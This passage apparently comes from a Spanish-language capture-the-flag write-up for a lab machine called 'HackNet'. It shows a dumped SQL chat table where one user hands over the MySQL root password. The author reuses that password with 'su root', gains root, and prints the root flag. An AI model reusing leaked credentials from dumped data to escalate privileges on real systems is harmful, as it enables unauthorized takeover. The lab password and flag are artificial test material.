(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won't take long, I promise.',1,22,18),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here's the password: h4ck3rs4re3veRywh3re99. Let me know when you're done.',1,18,22),
(51,'2024-12-29 20:30:56.880458','Got it. Thanks a lot! I'll let you know as soon as I'm finished.',1,22,18),
(52,'2024-12-29 20:31:16.112930','Cool. If anything goes wrong, ping me immediately.',0,18,22);
..................................<RESTO DE INFO>..................................
```

Si vemos esas lineas en concreto nos pone lo que parece la `password` del usuario `root`, por lo que vamos a probar a utilizarla:

```shell
su root
```

Metemos como contraseña `h4ck3rs4re3veRywh3re99`...

```
root@hacknet:/var/www/HackNet/backups# whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` de `root`.

> root.txt

```
5a4c738d14c27fa9dff9faa87877f5a2
```
